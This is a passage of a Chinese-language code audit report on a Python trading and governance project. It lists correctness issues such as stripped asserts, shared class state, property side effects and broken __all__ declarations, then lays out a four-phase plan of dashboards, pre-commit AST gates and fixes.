- **证据**：7处 `assert self._conn is not None` 检查SQLite连接。`python -O` 下assert被移除，`self._conn.execute(...)` 在 `_conn` 为None时抛出 `AttributeError` 而非有意义的 `RuntimeError`。事务管理器是核心持久化路径。
- **修复**：改为 `if self._conn is None: raise RuntimeError("connection not established")`。

#### 5.88.2 [HIGH] task_repo.py 8处assert检查post-write fetch非None

- **文件**：`src/zephyr/governance/task_repo.py:1102,1241,1308,1440,1478,1517,1672,2774`
- **证据**：每次写操作（INSERT/UPDATE）后fetch行并用assert检查非None。注释"刚刚写入，不应为None"表明开发者认为是不变量。但并发环境或SQLite异常下fetch可能返回None。`python -O`下检查消失，`_row_to_taskcard(None)` 抛出 `TypeError`。
- **修复**：改为 `if row is None: raise RuntimeError(f"post-write fetch returned None for task_id={task_id}")`。

#### 5.88.3 [HIGH] transition.py 1处assert检查post-write fetch非None

- **文件**：`src/zephyr/governance/transition.py:246`
- **证据**：与5.88.2相同的模式——状态转换后fetch并assert非空。
- **修复**：同5.88.2。

#### 5.88.4 [HIGH] hallucination_detector.py 4副本16处assert检查DI注入非None

- **文件**（4副本各4处=16处）：
  - `src/zephyr/trading/orchestrator/hallucination_detector.py:557,623,643,709`
  - `src/zephyr/trading/orchestrator/resilience/hallucination_detector.py:557,623,643,709`
  - `src/zephyr/governance/audit_orchestration/hallucination_detector.py:557,623,643,709`
  - `src/zephyr/governance/audit_orchestration/resilience/hallucination_detector.py:557,623,643,709`
- **证据**：4份完全相同的代码副本，各4处 `assert self._primary is not None` / `assert self._verifier is not None`。`python -O` 下检查消失，后续 `self._primary(...)` 抛出 `TypeError: 'NoneType' object is not callable`，错误信息难以诊断。
- **修复**：改为 `if self._primary is None: raise RuntimeError("primary LLM not injected")`，并消除4份代码重复。

#### 5.88.5 [HIGH] intent_parser.py 2副本4处assert检查DI注入非None

- **文件**（2副本各2处=4处）：
  - `src/zephyr/autonomy_core/intent_parser.py:269,322`
  - `src/zephyr/autonomy_core/parsing/intent_parser.py:264,317`
- **证据**：2份代码副本，各2处 `assert self._emb is not None` / `assert self._llm is not None`。`python -O` 下检查消失。
- **修复**：同5.88.4，改为if/raise，并消除重复。

#### 5.88.6 [MEDIUM] circuit_breaker.py 1处assert检查post-write fetch非None

- **文件**：`src/zephyr/governance/rule_enforcement/circuit_breaker.py:343`
- **证据**：`assert updated is not None  # 刚刚写入，不应为 None`。熔断器状态写入后fetch并assert。`python -O` 下检查消失。
- **修复**：改为 `if updated is None: raise RuntimeError(...)`。

#### 5.88 严重度汇总

| 严重度 | 数量 | 编号 |
|---|:---:|---|
| HIGH | 5 | 5.88.1/5.88.2/5.88.3/5.88.4/5.88.5 |
| MEDIUM | 1 | 5.88.6 |
| **合计** | **6** | |

---

### 5.89 类级可变状态（8个，第18轮新增）

> 维度AE：类定义中直接使用可变对象作为类属性，所有实例共享

#### 5.89.1 [MEDIUM] daemon_registry._entries ClassVar dict共享

- **文件**：`src/zephyr/shared/lifecycle/daemon_registry.py:133`
- **证据**：`_entries: ClassVar[dict[str, DaemonEntry]] = {}` 是类级可变dict，所有实例共享。被多个classmethod修改（register/start/stop）。若创建多个DaemonRegistry实例（虽然设计为单例），状态会意外共享。
- **修复**：强制单例模式或改为实例属性。

#### 5.89.2 [MEDIUM] daemon_registry._pressure_history ClassVar list共享

- **文件**：`src/zephyr/shared/lifecycle/daemon_registry.py:135`
- **证据**：`_pressure_history: ClassVar[list[ResourceSnapshot]] = []` 类级可变list。多实例时历史数据混合。
- **修复**：改为实例属性或强制单例。

#### 5.89.3 [MEDIUM] daemon_registry._on_pressure_callbacks ClassVar list共享

- **文件**：`src/zephyr/shared/lifecycle/daemon_registry.py:140`
- **证据**：`_on_pressure_callbacks: ClassVar[list[Callable]] = []` 类级可变list。多实例注册不同回调会相互干扰。
- **修复**：同5.89.1。

#### 5.89.4 [LOW] interface_base.py _registry ClassVar dict插件注册模式

- **文件**：`src/zephyr/frontend/interface_base.py:90,111,138`
- **证据**：3个基类各定义 `_registry: ClassVar[dict] = {}`，通过 `__init_subclass__` 自动注册子类。标准的Python插件注册模式，共享是有意为之。LOW。

#### 5.89.5 [LOW] pipeline_base.py _registry ClassVar dict（2副本）

- **文件**：`src/zephyr/simulation/pipeline_base.py:85,114` + `simulation/pipeline_base_from_resear.py:85,114`
- **证据**：与5.89.4相同的插件注册模式，2份代码副本。

#### 5.89.6 [LOW] analytics_base.py _registry ClassVar dict

- **文件**：`src/zephyr/reporting/analytics_base.py:66,89`
- **证据**：同5.89.4模式。

#### 5.89.7 [LOW] backtest_base.py _registry ClassVar dict（2副本）

- **文件**：`src/zephyr/simulation/backtest_base.py:80` + `simulation/backtest_base_from_resear.py:80`
- **证据**：同5.89.4模式，2份副本。

#### 5.89.8 [LOW] signal_synthesizer.py + factor_base.py _registry ClassVar dict

- **文件**：`src/zephyr/signal_fundamental/synth/signal_synthesizer.py:69` + `factor/factor_base.py:142`
- **证据**：同5.89.4模式。

#### 5.89 严重度汇总

| 严重度 | 数量 | 编号 |
|---|:---:|---|
| MEDIUM | 3 | 5.89.1/5.89.2/5.89.3 |
| LOW | 5 | 5.89.4/5.89.5/5.89.6/5.89.7/5.89.8 |
| **合计** | **8** | |

---

### 5.90 魔术方法一致性（1个，第18轮新增）

> 维度AG：魔术方法定义不符合Python协议。注：TriggerResult __eq__无__hash__已在5.83.1覆盖，此处不重复计数。

#### 5.90.1 [HIGH] factor_base.py @classmethod __len__失效

- **文件**：`src/zephyr/factor/factor_base.py:189-191`
- **证据**：`__len__` 被装饰为 `@classmethod`。Python魔术方法协议通过 `type(obj).__len__(obj)` 调用，classmethod会将cls绑定为类本身，导致调用时传入的obj变成多余参数，触发 `TypeError: __len__() takes 1 positional argument but 2 were given`。此 `__len__` 是死代码，给人可以工作的假象。
- **修复**：如果意图是 `len(FactorRegistry)` 返回注册表大小，需在元类上定义 `__len__`；如果意图是实例方法，移除 `@classmethod` 并将 `cls` 改为 `self`。

#### 5.90 严重度汇总

| 严重度 | 数量 | 编号 |
|---|:---:|---|
| HIGH | 1 | 5.90.1 |
| **合计** | **1** | |

---

### 5.91 Property副作用（4个，第18轮新增）

> 维度AH：@property getter在读取时修改对象状态，违反最小惊讶原则

#### 5.91.1 [MEDIUM] admission_controller.tokens getter调用_refill()修改状态

- **文件**：`src/zephyr/trading/admission_controller.py:114-118`
- **证据**：`@property def tokens(self)` 调用 `self._refill()`，修改 `self._tokens`（令牌补充）和 `self._last_refill`（时间戳更新）。多次读取tokens会不断推进 `_last_refill`。在调试器中查看此属性会改变对象状态。
- **修复**：将 `_refill()` 移到显式方法，getter仅返回不修改状态的近似值。

#### 5.91.2 [MEDIUM] admission_controller.state getter触发OPEN→HALF_OPEN转换

- **文件**：`src/zephyr/trading/admission_controller.py:168-175`
- **证据**：`@property def state(self)` 在条件满足时执行 `self._state = self._STATE_HALF_OPEN`。单纯观察属性改变了熔断器运行状态。HALF_OPEN模式下只允许有限次试探，仅读取state就消耗了唯一的转换机会。
- **修复**：将状态转换移到 `allow()`/`call()` 行为方法中，getter仅返回当前状态。

#### 5.91.3 [MEDIUM] resource_optimization.state getter修改状态和计数器

- **文件**：`src/zephyr/trading/resource_optimization.py:132-139`
- **证据**：与5.91.2相同模式。读取state不仅修改 `self._state`，还重置 `self._half_open_calls`。同类 `allow()` 方法（行141）也重复了这段转换逻辑。
- **修复**：提取为私有方法 `_try_recover()`，仅在 `allow()` 中调用。

#### 5.91.4 [MEDIUM] circuit_breaker.state getter调用_maybe_transition()

- **文件**：`src/zephyr/ops/circuit_breaker.py:61-65`
- **证据**：`@property def state(self)` 调用 `self._maybe_transition()`，方法名明确暗示会转换状态。同类 `call()` 方法（行67-72）也调用此方法。
- **修复**：同5.91.2/5.91.3。

#### 5.91 严重度汇总

| 严重度 | 数量 | 编号 |
|---|:---:|---|
| MEDIUM | 4 | 5.91.1/5.91.2/5.91.3/5.91.4 |
| **合计** | **4** | |

---

### 5.92 Enum正确性（2个，第18轮新增）

> 维度AI：Enum成员比较方式、缺少__str__导致日志不一致

#### 5.92.1 [LOW] 30+处Enum成员比较用==而非is

- **文件**（代表性实例，10+文件30+处）：
  - `src/zephyr/security/adversarial_validation/circuit_breaker.py:60,63,77,79,84,99`
  - `src/zephyr/security/adversarial_validation/async_monitor.py:116`
  - `src/zephyr/security/llm_defense/llm_security/layers/l5_resource_protection.py:163`
  - `src/zephyr/infrastructure/reliability/circuit_breaker.py:59,79,84`
  - `src/zephyr/ops/circuit_breaker.py:70,76`
- **证据**：PEP 8和Python官方文档推荐Enum成员使用 `is` 比较（身份比较），因为Enum成员是单例。`==` 虽功能正确，但 `is` 更快且不会被 `__eq__` 覆盖干扰。共30+处使用 `==` 比较Enum成员。
- **修复**：将 `self._state == CircuitState.OPEN` 改为 `self._state is CircuitState.OPEN`。

#### 5.92.2 [LOW] 7个plain Enum缺少自定义__str__/__repr__

- **文件**：`trading/trading_contracts/execution/order.py:21-41`（OrderSide/OrderType/OrderStatus）、`ops/circuit_breaker.py:33-36`（CircuitState）、`behavioral_audit/drift_models.py:41-85`（DriftState/ScanLevel/Severity/OrphanClassification）、`ops/evolution_engine.py:27-45`（Severity/FeedbackLayer/EvolutionSignal）、`ex_core/order_manager.py:54-57`（OrderAction）、`ex_core/execution_engine.py:60-64`（AlgoType）、`trading/zombie_scanner.py:70`（ZombieCategory）
- **证据**：这些plain `Enum`（非 `str, Enum`）的默认 `__str__` 返回 `"ClassName.MEMBER"`（如 `"CircuitState.OPEN"`），而项目中大量 `str, Enum` 子类的 `__str__` 返回值本身（如 `"OPEN"`）。两类Enum混用导致日志格式不一致。
- **修复**：对需要出现在日志中的plain Enum添加 `def __str__(self): return self.value`，或统一改用 `str, Enum`。

#### 5.92 严重度汇总

| 严重度 | 数量 | 编号 |
|---|:---:|---|
| LOW | 2 | 5.92.1/5.92.2 |
| **合计** | **2** | |

---

### 5.93 __init__.py污染（8个，第18轮新增）

> 维度AJ：__init__.py中的重型import、无效__all__、命名空间污染

#### 5.93.1 [HIGH] zephyr/__init__.py import时执行重型副作用

- **文件**：`src/zephyr/__init__.py:63,125-127,142-144`
- **证据**：`import zephyr` 会：(1) `_load_dotenv()` 读取.env文件修改os.environ；(2) 启动daemon Timer线程执行遥测bootstrap（monkey-patch）；(3) 启动另一个daemon Timer执行服务注册。import有全局副作用，违反"import应无副作用"原则。（交叉参考5.77.1 daemon Timer线程、5.79 导入副作用）
- **修复**：移到显式 `zephyr.init()` 函数，由应用入口点调用。

#### 5.93.2 [HIGH] zephyr/__init__.py __all__列出10个不存在的子包

- **文件**：`src/zephyr/__init__.py:163-194`
- **证据**：`__all__` 列出30个子包名，但以下10个在 `src/zephyr/` 下不存在：`data`、`execution`、`observability`、`orchestration`、`portfolio`、`research`、`resilience`、`semantic_auditor`（仅compliance下重导出）、`signal`（仅有signal_ashare等）、`testing`。`from zephyr import *` 会抛出 `ImportError`。
- **修复**：从 `__all__` 移除不存在的子包名，或创建对应子包。

#### 5.93.3 [HIGH] shared/__init__.py __all__列出170+名称但无任何import

- **文件**：`src/zephyr/shared/__init__.py:4-173`
- **证据**：文件仅包含注释和 `__all__ = [...]`（170+名称如EventBus/StateMachine/ZephyrLogger），无任何import语句，无 `__getattr__`。`from zephyr.shared import EventBus` 会失败。`__all__` 与运行时行为完全不匹配。
- **修复**：添加对应import语句，或添加PEP 562 `__getattr__` 懒加载，或删除 `__all__`。

#### 5.93.4 [HIGH] trading/__init__.py __all__列出41名称但无任何import

- **文件**：`src/zephyr/trading/__init__.py:3-45`
- **证据**：与5.93.3相同问题。`__all__` 列出41个名称（action_dispatcher/admission_controller/autopilot等），无import语句，无 `__getattr__`。`from zephyr.trading import autopilot` 会失败。
- **修复**：同5.93.3。

#### 5.93.5 [HIGH] 13个__init__.py使用无效的__all__=["*"]

- **文件**（13处）：`compliance/zero_knowledge_audit_stub/__init__.py:7`、`compliance/semantic_auditor/__init__.py:7`、`compliance/implementations/__init__.py:7`、`compliance/compliance_gate_a6/__init__.py:7`、`compliance/behavioral_auditor/__init__.py:7`、`compliance/audit_orchestrator/__init__.py:7`、`compliance/behavioral_admission/__init__.py:7`、`pf_core/strategy_engine/__init__.py:7`、`pf_core/performance_attribution_engine/__init__.py:7`、`ops/schema/__init__.py:6`、`ops/profiles/__init__.py:6`、`ops/health/__init__.py:6`、`ops/alerts/__init__.py:6`
- **证据**：`__all__ = ["*"]` 意味着包的唯一"公开名称"是字面量 `"*"`。`from ... import *` 会尝试获取名为 `"*"` 的属性，触发 `ImportError: cannot import name '*'`。开发者意图是"重导出所有内容"，但此语法不实现该语义。
- **修复**：删除 `__all__ = ["*"]`（不定义 `__all__` 时默认导出所有非下划线名称），或显式列出名称。

#### 5.93.6 [MEDIUM] 83处from ... import *导致命名空间污染

- **文件**：83处出现在 `__init__.py` 中（Grep返回83行）
- **代表性文件**：`governance/trading_contracts/market/__init__.py:3-9`（7个子模块import *）、`security/llm_defense/llm_security_01/layers/__init__.py:4-12`（9个子模块import *）
- **证据**：`from ... import *` 将子模块所有公开名称导入当前命名空间，可能造成名称冲突（多个子模块都定义Severity/Status等常见名称），也使追踪名称来源困难。
- **修复**：改为显式导入 `from .module import Name1, Name2`。

#### 5.93.7 [MEDIUM] infrastructure/config/__init__.py中定义类和函数

- **文件**：`src/zephyr/infrastructure/config/__init__.py:46,53-66,69-72,75,154`
- **证据**：`__init__.py` 中定义了 `AppConfig` dataclass、`load_config()` 函数、`reload_config()` 函数、`_deep_merge_lists()` 函数。`__init__.py` 应仅做包初始化和重导出，不应定义业务类/函数。
- **修复**：移到 `app_config.py` 子模块，`__init__.py` 仅做 `from .app_config import AppConfig` 重导出。

#### 5.93.8 [MEDIUM] behavioral_audit/__init__.py 256条手动符号映射

- **文件**：`src/zephyr/behavioral_audit/__init__.py:16-273,279-292,295-309`
- **证据**：`_SYMBOL_SOURCE` 字典包含256条符号到子模块的映射，`__getattr__` 实现PEP 562懒加载。虽比5.93.3/5.93.4的做法好，但维护256条手动映射是脆弱的——新增符号时必须同步更新此字典。
- **修复**：用自动化方式（如遍历子模块的 `__all__`）替代手动映射。

#### 5.93 严重度汇总

| 严重度 | 数量 | 编号 |
|---|:---:|---|
| HIGH | 5 | 5.93.1/5.93.2/5.93.3/5.93.4/5.93.5 |
| MEDIUM | 3 | 5.93.6/5.93.7/5.93.8 |
| **合计** | **8** | |

---

## 六、治本施工方案（4期）

> 按"先建强制消费链（治本）→ 再批量修违规点（治标）→ 最后收敛治理层（元治本）"的顺序，分4期施工。

### 第0期：架构健康度仪表盘（最高优先级基础设施，治根因1+5）

**目标**：把trae_060 §5的静态快照替换为动态实时仪表盘，让所有违规可见、可量化、可追踪。

| # | 任务 | 输出 | 验证标准 |
|---|---|---|---|
| 0.1 | 新建`scripts/governance/health_dashboard.py` | 单一Python脚本，扫描全项目输出JSON | `python health_dashboard.py`输出`.runtime/health_dashboard_<ts>.json` |
| 0.2 | 仪表盘指标实现（10项） | 见裁定4清单 | 每项指标可独立运行，输出数值+违规清单 |
| 0.3 | 注册为post-commit reconciler | 在[reconciliation_registry.py](file:///D:/ZephyrAlpha/src/zephyr/governance/reconciliation_registry.py)新增`make_health_dashboard_reconciler`，priority=900 | commit后自动生成latest.json |
| 0.4 | AGENTS.md顶部加指针 | §0新增"最新健康度见`.runtime/health_dashboard_latest.json`" | 新AI第一眼看到指针 |
| 0.5 | project_rules.md PRE-OP检查新增"读仪表盘" | RULE-NINE资产认知改为"读仪表盘JSON" | 新AI进项目先读JSON再读规则 |

**回滚方案**：仪表盘是只读扫描，无写入风险。回滚只需删除reconciler注册条目。

**预期收益**：
- 治根因1（静态快照→动态实时）
- 治根因5（规则膨胀→仪表盘替代1529行文档认知）
- 让298个问题从离散报告变成趋势曲线，可量化治理进度

### 第1期：建立6个AST强制消费链门禁（治根因2+3+4，治本核心）

**目标**：把"建议性规则"转化为"commit时阻断的AST门禁"，让AI无法绕过。

| # | 门禁名称 | 治理根因 | 检测逻辑 | 阻断方式 | 影响问题数 |
|---|---|---|---|---|---|
| 1.1 | `check_manual_only_permanent` | 根因4 | AST扫描`.py`文件，检测`[STARTUP] manual`标记 + 无`event_bus.subscribe`/`hook_registry.register`调用 | exit 1 + 提示"永久脚本MUST事件注册" | 96 manual脚本 |
| 1.2 | `check_vocab_hardcode_v2`（语义级） | 根因2 | 扩展现有GATE-VOCAB：从正则模式匹配升级为"加载所有词表YAML值集合→扫描代码中所有字面量集合赋值→比对" | exit 1 + 提示"词表X值必须从YAML动态加载" | 41硬编码+60盲区 |
| 1.3 | `check_gate_capability_registration` | 根因3 | 扫描`.pre-commit-config.yaml`所有gate-* id → 比对capability_canonical_file_registry.yaml的aliases | exit 1 + 提示"GATE-X MUST登记capability" | 40 GATE无反查 |
| 1.4 | `check_duplicate_function_definition` | 根因3 | AST扫描同名函数定义（atomic_write/load_yaml/parse_frontmatter等），超过1处即阻断 | exit 1 + 提示"函数X已存在于Y，MUST import" | 6重复簇 |
| 1.5 | `check_file_copy_pairs` | 根因1 | 计算所有`.py`文件对的AST共享行百分比，≥60%即阻断 | exit 1 + 提示"文件X与Y内容重复，MUST合并" | 159文件复制对 |
| 1.6 | `check_empty_event_handler` | 根因4 | AST扫描`def _on_*`/`def handle_*`函数体，仅含`logger.*`/`pass`即阻断 | exit 1 + 提示"handler MUST有非log实体" | 6空handler |

**实施策略**：
- 每个门禁独立开发，独立注册到`CommitGateRegistry`
- **过渡期1个月**：新门禁先以`warn-only`模式运行，输出违规清单但不阻断
- **过渡期结束后**：升级为`block`模式
- 仪表盘（第0期）实时显示各门禁的违规数趋势

**回滚方案**：每个门禁通过`CommitGateRegistry.register(GateSpec)`注册，回滚只需删除注册条目。

**预期收益**：
- 治根因2（词表消费链从模式匹配升级为语义匹配）
- 治根因3（CapabilityLookup从建议性升级为强制性）
- 治根因4（manual例外从人工判定升级为机械检测）
- 建立项目首个"pre-commit AST强制消费链"体系（除GATE-VOCAB外）

### 第2期：批量修复298个违规点（治标，但有仪表盘+门禁保驾护航）

**目标**：在门禁保护下，批量清理历史遗留违规点，让仪表盘指标归零。

#### P0组：高危幻觉源（必须先修）

| # | 任务 | 影响问题 | 验证标准 |
|---|---|---|---|
| 2.1 | 删除根目录`depgraph`残留文件 | 5.3.5 | 仪表盘"文件残留数"=0 |
| 2.2 | 修复`_STABILITY_VALUES`值域错位（3文件改动态加载） | 5.1.1#1-3 | `check_vocab_hardcode_v2`通过 |
| 2.3 | 修复`VALID_MODULE_STATUSES`/`VALID_CONTRACT_STATUSES`硬编码 | 5.1.1#14-15 | `check_vocab_hardcode_v2`通过 |
| 2.4 | 补注册10个关键能力到capability_canonical_file_registry.yaml | 5.3.1 | `check_gate_capability_registration`通过 |
| 2.5 | 修复F1 AutoPilot `_on_task_completed`空handler | 5.2.1#1 | `check_empty_event_handler`通过 |
| 2.6 | 修复`get_depgraph_pg_connection`同名wrapper | 5.1.5#1 | GATE-VOCAB通过 |

#### P1组：结构性漂移（近期修复）

| # | 任务 | 影响问题 | 验证标准 |
|---|---|---|---|
| 2.7 | 合并159对文件复制（分批：簇1 71对 / 簇2 51对 / 簇3 19对 / 其他18对） | 5.1.2 | `check_file_copy_pairs`通过（每批合并后仪表盘数下降） |
| 2.8 | 收敛6个重复簇 | 5.1.4 | `check_duplicate_function_definition`通过 |
| 2.9 | 补注册40个GATE的capability_id | 5.3.2 | `check_gate_capability_registration`通过 |
| 2.10 | 修复F21 IdeHealthDaemon时间触发 | 5.2.2#1 | 仪表盘"时间触发数"下降 |
| 2.11 | 修复rule_watcher双重违规 | 5.2.2#13 + 5.2.4#1 | 仪表盘"manual-only数"下降 |
| 2.12 | 修复6个空handler | 5.2.1 | `check_empty_event_handler`通过 |
| 2.13 | 修复blueprint_registry.yaml module_id重复 | 5.3.4 | YAML校验通过 |
| 2.14 | 统一_master_blueprint路径（11文件57行连字符→下划线） | 5.3.6 | `grep "_master-blueprint"`返回0 |

#### P2组：补强防御纵深（计划修复）

| # | 任务 | 影响问题 | 验证标准 |
|---|---|---|---|
| 2.15 | 修复15个时间触发守护线程 | 5.2.2 | 仪表盘"时间触发数"=0 |
| 2.16 | 修复26个poll-loop | 5.2.3 | 仪表盘"poll-loop数"下降 |
| 2.17 | 修复3个同步副本 | 5.1.3 | 文件对比一致 |
| 2.18 | 修复26个MEDIUM词表硬编码 | 5.1.1#16-41 | `check_vocab_hardcode_v2`通过 |
| 2.19 | 修复AGENTS.md §6 vs §11 depgraph表述矛盾 | 5.3.3 | 文档一致性校验通过 |

**实施策略**：
- 每批修复后运行仪表盘，确认指标下降
- 门禁已在第1期建立，修复后门禁自动验证
- 159对文件复制分批合并，每批10-20对，避免单次commit过大

**回滚方案**：每批修复独立commit，回滚只需`git revert <commit>`。

### 第3期：治理层收敛与规则瘦身（元治本，治根因5）

**目标**：从源头减少治理组件数，让治理体系自身不再成为漂移源。

| # | 任务 | 治理目标 | 验证标准 |
|---|---|---|---|
| 3.1 | **L5治理层14功能收敛为5-6功能** | F34/F35设计态删除（零代码零消费方）；F6/F18/F29合并为"统一检测器"；F15保留为"统一修复器"；F30保留为"统一验证器"；F31明确"注册表schema治理"责任 | core_function_dependency_design.md（`_archive/`）更新，37→32-34功能 |
| 3.2 | **52 GATE收敛为15个高优先级GATE** | 评估每个GATE的"违规后果严重度×发生频率"，低优先级降级为warn-only或删除 | `.pre-commit-config.yaml` gate数下降，仪表盘显示 |
| 3.3 | **17 reconciler合并非阻断项** | warn-only的reconciler合并为1个"健康度报告reconciler" | reconciliation_registry.py reconciler数下降 |
| 3.4 | **48注册表按消费分类** | 未被代码消费的注册表直接归档；被消费的保留 | 仪表盘"注册表消费率"指标 |
| 3.5 | **project_rules.md瘦身** | 把20条RULE-*逐条评估，能做成AST门禁的转，不能做的降级为review checklist；目标从1529行降到500行以内 | 行数统计 |
| 3.6 | **trae_060 §5清单删除** | 静态快照已被仪表盘替代，§5整段删除并加指针"实时数据见仪表盘" | trae_060行数下降 |
| 3.7 | **6个月规则冻结令** | AGENTS.md新增"规则冻结令"段落：6个月内不加新.md规则段落，新违规点一律转化为AST门禁 | 提交时检测新增.md规则段落即阻断 |

**实施策略**：
- 元治本必须最后做，避免在执行闭环未建立前动治理结构
- 每个收敛动作前先在仪表盘确认当前状态，避免误删活功能
- F34/F35删除前必须确认零代码零消费方（RULE-THREE删除前置）

**回滚方案**：治理层收敛通过git commit分步进行，回滚只需revert对应commit。

### 施工总览

```
第0期：仪表盘（基础设施）
   ↓ 治根因1+5
第1期：6个AST门禁（强制消费链）
   ↓ 治根因2+3+4
第2期：298违规点批量修复（治标）
   ↓ 有门禁保驾护航
第3期：治理层收敛+规则瘦身（元治本）
   ↓ 治根因5
最终态：规则:执行 ≈ 1:1，仪表盘指标全部归零
```

### 各期预期收益

| 期 | 治理根因 | 影响问题数 | 预期仪表盘指标变化 |
|---|---|---|---|
| 第0期 | 1+5 | 0（基础设施） | 仪表盘上线，298问题可见 |
| 第1期 | 2+3+4 | 298（门禁覆盖） | 6个门禁上线，新违规无法产生 |
| 第2期 | 1（间接） | 298（批量修复） | 仪表盘指标逐步归零 |
| 第3期 | 5 | 0（结构收敛） | 治理组件数下降，规则:执行≈1:1 |

### 关键里程碑

| 里程碑 | 完成标志 | 验证方法 |
|---|---|---|
| M1：仪表盘上线 | `.runtime/health_dashboard_latest.json`生成 | 新AI进项目读JSON即可认知全貌 |
| M2：6门禁上线 | 6个`check_*`门禁注册到CommitGateRegistry | `git commit`时自动阻断新违规 |
| M3：298问题归零 | 仪表盘所有指标=0 | 6个门禁全部通过 |
| M4：治理层收敛 | 37→32功能 / 52→15 GATE / 1529→500行规则 | 仪表盘"治理组件数"下降 |

### 风险与缓解

| 风险 | 概率 | 影响 | 缓解措施 |
|---|---|---|---|
| 第1期门禁过严阻断正常开发 | 高 | 高 | 过渡期1个月warn-only模式 |
| 第2期159对文件合并误删活代码 | 中 | 高 | 每批10-20对，合并后跑全量测试 |
| 第3期治理层收敛误删活功能 | 中 | 高 | 删除前确认零代码零消费方 |
| 仪表盘自身漂移 | 低 | 中 | 仪表盘指标纳入自身监控（递归） |

---

## 七、客观立场声明

本裁定不否定项目现有设计的价值——trae_060三原则（能现成不创造/创造必全自动/第一性原理治本）方向正确，CapabilityLookup/GATE-VOCAB/GitCommitGateway/17 reconciler等基础设施已具备治本潜力。

问题在于**强制消费链的覆盖率不足**（仅1个AST门禁）和**规则文档膨胀导致的执行断层**。修复方向不是推翻现有设计，而是：
1. 把建议性规则转化为强制消费链（第1期）
2. 把静态快照替换为动态仪表盘（第0期）
3. 把治理层14功能收敛为5-6功能（第3期）
4. 把298个历史违规点在门禁保护下批量清理（第2期）

**核心矛盾**：100% AI开发场景下，"建议性规则"是反模式。AI没有"自觉"，只有"被阻断"。项目当前规则:执行≈10:1，应通过4期施工把比例降到1:1。

---

## 附录：审核方法说明

### 审核员立场
客观专业架构师，基于真实文件证据，不偏袒现有设计也不全盘否定。

### 数据来源
1. **SSoT真源唯一性**：4个并行子agent读真实文件 + Grep真实结果 + AST共享行百分比判定（≥60%=COPY，35-59%=DRIFTED，<35%=DIFFERENT）
2. **永久系统触发**：Grep扫描`[STARTUP] manual` / `while True` / `time.sleep` / `threading.Timer` / `schedule.every` / `cron` / `periodic` / `circadian` + handler实体读取
3. **新AI可发现性**：capability_canonical_file_registry.yaml交叉比对 + .pre-commit-config.yaml gate-* id枚举 + 物理文件Glob验证

### 审核日期
2026-06-30

### 审核范围
- `D:\ZephyrAlpha\src\zephyr\**\*.py`（排除_archive/test）
- `D:\ZephyrAlpha\scripts\**\*.py`（排除_archive/test）
- `D:\ZephyrAlpha\docs\**\*.md` + `*.yaml`
- `D:\ZephyrAlpha\.trae\rules\*.md`
- `D:\ZephyrAlpha\AGENTS.md` + `.pre-commit-config.yaml`

### 未修改任何文件
所有裁定基于真实文件证据和4轮深度调研的真实Grep结果。本文档为只读审核报告，未对项目代码做任何修改。
